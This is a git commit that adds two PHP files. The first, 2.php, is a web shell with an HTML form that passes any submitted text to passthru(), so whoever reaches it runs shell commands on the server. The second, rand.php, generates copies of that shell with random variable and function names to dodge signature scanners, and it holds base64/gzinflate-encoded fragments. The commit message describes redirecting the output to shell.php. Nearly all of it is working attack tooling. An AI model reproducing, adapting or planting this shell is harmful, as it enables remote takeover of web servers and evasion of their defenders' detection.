9f3398e36ecbbf368b0eb3959dd6ed04ef141c9f
raincoats <tomshaddock@outlook.com>
2015-06-11 11:26:35 +1000

    generator works, use it like `php -f 2233.php > shell.php

---
+++ 2.php
@@ -0,0 +1,33 @@
+
+<?php
+
+$nbgc5iZ5AWTQba = <<< EOF
+<html>
+	<head>
+		<style>
+			input{ background-color: rgb(255, 255, 255); width: 50%;}
+			* { font-size: 12px; color: rgb(0, 0, 0); font-family: monospace !important;}
+			body{ background-color: rgb(250, 250, 250);}
+			xXCocQi7HCePh{ color: rgb(170, 170, 170);}
+		</style>
+	</head>
+	<body>
+		<form action="bDv98RgirbPK0s" id="form" method="POST">
+			<span>$ </span>
+			<input type="text" name="2233" autocomplete="off" autofocus>
+			<span> 2&gt;&amp;1 </span>
+			<button type="submit">$$$</button>
+		</form>
+	<code>
+<pre>
+EOF;
+
+function ZJigkH6cHbw42($jhHxW8mpnm4EH){
+	echo "<xXCocQi7HCePh>$ ".$jhHxW8mpnm4EH."</xXCocQi7HCePh><br>";
+	echo passthru($jhHxW8mpnm4EH." 2>&1");
+}
+$d1OFjXWj8Gzqye=$_REQUEST["2233"];
+echo preg_replace('/bDv98RgirbPK0s/', basename($_SERVER["SCRIPT_NAME"]), $nbgc5iZ5AWTQba);
+
+isset($d1OFjXWj8Gzqye)? ZJigkH6cHbw42($d1OFjXWj8Gzqye) : $WeMiOHVgQ3Jn9=$qhezVN09hhd04
+;?>
---
+++ rand.php
@@ -0,0 +1,85 @@
+<?php
+/*
+<?php 
+function $functions[1]($functions[2]){
+	echo "<asdf>$ ".$functions[2]."</asdf><br>";
+	echo passthru($functions[2]." 2>&1");
+}
+$functions[4]=$_REQUEST["2233"];
+$functions[5]=basename($_SERVER['SCRIPT_NAME']);
+echo gzinflate(base64_decode('bY7NDoIwEIRfBTVeTAjVxEtb+y5Lf6SRdpt2iSLh3RXhaOb2zUxmZEehV7KzYJQsNPZW+ZgGmlrQj3vGIZpaY4+ZH5xz4ukNdfzKjmI+TQ4j1cW/LT9f0ktsMcaY+DkOgu9HHjBiSaBttfMhYSaIJOYWzfhvAxaJGYpx08YAvkA26znZrFeXvpIOc6hAk8d4238A')).$functions[5].gzinflate(base64_decode('NY5RCsIwEESvsiyhv8X0s9u9goJeIG0TDZhsaDegt7fa+jfzBh6DEOcBgywJIXl9yNYu5+sNmdbiMhug9hco5lIV9F38gOpfipBd2rK1XYfgqsokqTy9bkxC2FGQqa6HCmxz175xqfSnv3SsqpIP61rHFBXZGEPtvjC1329Mk8yeqSyePw=='));
+isset($functions[4])?$functions[1]($functions[4]):$fieowfhh4ioejhceuifph3u='';?>
+*/
+
+
+$functions = array(
+	preg_replace('/^[0-9]+/', '',  preg_replace('~([\.\$/]|.{16}$)~', '', crypt(rand() * rand()))),
+	preg_replace('/^[0-9]+/', '',  preg_replace('~([\.\$/]|.{16}$)~', '', crypt(rand() * rand()))),
+	preg_replace('/^[0-9]+/', '',  preg_replace('~([\.\$/]|.{16}$)~', '', crypt(rand() * rand()))),
+	preg_replace('/^[0-9]+/', '',  preg_replace('~([\.\$/]|.{16}$)~', '', crypt(rand() * rand()))),
+	preg_replace('/^[0-9]+/', '',  preg_replace('~([\.\$/]|.{16}$)~', '', crypt(rand() * rand()))),
+	preg_replace('/^[0-9]+/', '',  preg_replace('~([\.\$/]|.{16}$)~', '', crypt(rand() * rand()))),
+	preg_replace('/^[0-9]+/', '',  preg_replace('~([\.\$/]|.{16}$)~', '', crypt(rand() * rand()))),
+	preg_replace('/^[0-9]+/', '',  preg_replace('~([\.\$/]|.{16}$)~', '', crypt(rand() * rand()))),
+	preg_replace('/^[0-9]+/', '',  preg_replace('~([\.\$/]|.{16}$)~', '', crypt(rand() * rand()))),
+);
+/*
+$html = <<< EOF
+<html>
+	<head>
+		<style>
+			input{ background-color: rgb(255, 255, 255); width: 50%;}
+			* { font-size: 12px; color: rgb(0, 0, 0); font-family: monospace !important;}
+			body{ background-color: rgb(250, 250, 250);}
+			$functions[3]{ color: rgb(170, 170, 170);}
+		</style>
+	</head>
+	<body>
+		<form action="$functions[5]" id="form" method="POST">
+			<span>$ </span>
+			<input type="text" name="2233" autocomplete="off" autofocus>
+			<span> 2&gt;&amp;1 </span>
+			<button type="submit">$$$</button>
+		</form>
+	<code>
+<pre>
+EOF;
+*/
+// echo "<html 1>".$'.$functions[5].'<html 2>;
+
+
+echo '
+<?php
+
+$'.$functions[8].' = <<< EOF
+<html>
+	<head>
+		<style>
+			input{ background-color: rgb(255, 255, 255); width: 50%;}
+			* { font-size: 12px; color: rgb(0, 0, 0); font-family: monospace !important;}
+			body{ background-color: rgb(250, 250, 250);}
+			'.$functions[3].'{ color: rgb(170, 170, 170);}
+		</style>
+	</head>
+	<body>
+		<form action="'.$functions[5].'" id="form" method="POST">
+			<span>$ </span>
+			<input type="text" name="2233" autocomplete="off" autofocus>
+			<span> 2&gt;&amp;1 </span>
+			<button type="submit">$$$</button>
+		</form>
+	<code>
+<pre>
+EOF;
+
+function '.$functions[1].'($'.$functions[2].'){
+	echo "<'.$functions[3].'>$ ".$'.$functions[2].'."</'.$functions[3].'><br>";
+	echo passthru($'.$functions[2].'." 2>&1");
+}
+$'.$functions[4].'=$_REQUEST["2233"];
+echo preg_replace('."'/".$functions[5]."/'".', '."basename(\$_SERVER[\"SCRIPT_NAME\"]), $".$functions[8].');
+
+isset($'.$functions[4].')? '.$functions[1].'($'.$functions[4].') : $'.$functions[6].'=$'.$functions[7].'
+;?>';
+
+?>
